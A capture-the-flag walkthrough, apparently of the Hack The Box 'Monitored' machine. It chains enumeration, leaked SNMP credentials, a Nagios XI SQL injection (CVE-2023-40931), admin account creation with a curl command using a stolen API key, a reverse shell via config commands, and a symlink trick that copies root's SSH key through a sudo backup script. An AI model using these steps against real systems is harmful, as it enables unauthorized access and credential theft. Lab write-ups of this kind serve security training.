Started with nmap scan
```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
123 UDP
161 UDP 
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
| -----BEGIN CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped syn-ack ttl 63
```
So there is a domain linked to the webhost and if we got to port `80` it redirects us to `443` and its running `nagios XI` running a UDP scan now also since im not finding much and we have two open port `123,161`  running `snmp-check 10.10.11.248` and it returns all the info about the snmp and shows all the process runing on the server and there is a script being ran by sudo `/opt/scripts/check_host.sh` and has some creds in the command line `svc:XjH7VCehowpR1xZB` we can try these creds in the web UI but it returns a different error message saying the account is disabled so now running a gobuster on the site 
```
/tools                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/tools/]
/about                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/about/]
/images               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/images/]
/help                 (Status: 301) [Size: 338] [--> https://nagios.monitored.htb/nagiosxi/help/]
/mobile               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/mobile/]
/admin                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/admin/]
/reports              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/reports/]
/account              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/account/]
/includes             (Status: 301) [Size: 342] [--> https://nagios.monitored.htb/nagiosxi/includes/]
/backend              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/backend/]
/db                   (Status: 301) [Size: 336] [--> https://nagios.monitored.htb/nagiosxi/db/]
/api                  (Status: 301) [Size: 337] [--> https://nagios.monitored.htb/nagiosxi/api/]
/config               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/config/]
/views                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/views/]
/sounds               (Status: 403) [Size: 286]
/terminal             (Status: 200) [Size: 5215]
```
and there is a interesting folder `/api/` and there is a `/v1/` endpoint so now we need FUZZ the api and there is a endpoint `/api/v1/authenticate` and if we send it a POST request then we get back need a username and password so we give it the svc creds and now we have a auth token we can use now fuzzing the login GET parameters to see if there is anything abnormal we can use and there is a `token=` and then we put are code and now we are logged into the site there is a `CVE-2023-40931` which is a sqli vulnerability and its vulnerable to it so we can use sqlmap to dump the database of the `xi_users` and new we have the hashes and api keys for both users and now there is another api endpoint to make a user with the admin api key `/api/v1/system/user?apikey=` and we can take this to make new accounts with admin privilege's 
```
curl -k "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" \
  -d "username=test" \
  -d "password=test123" \
  -d "name=testst" \
  -d "email=test@g.com" \
  -d "auth_level=admin" \
  -d "force_pw_change=0"

{
    "success": "User account test was added successfully!",
    "user_id": 9
}
```
and then we login and go to Configure > core config manager > commands and then put it in a reverse shell and save it then go to `Monitoring > Hosts` click on localhost and then run the command what ever you called it I called mine `shell` and then run it and now we have a call back as the `nagios` user and now we can get the user flag running `sudo -l` we have 21 things we can run as root there is one called `getprofile` and it does alot of backup on log files and there is one file that does not exist `phpmailer.log` so we can set a sym link to this file so when it backups we get the contents of the file
```
ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
cp /usr/local/nagiosxi/var/components/profile.zip /tmp
unzip /tmp/profile.zip
cat profile-(id)/phpmailer.log
```
it has the `id_rsa` key for the root user now we can just ssh into the root account 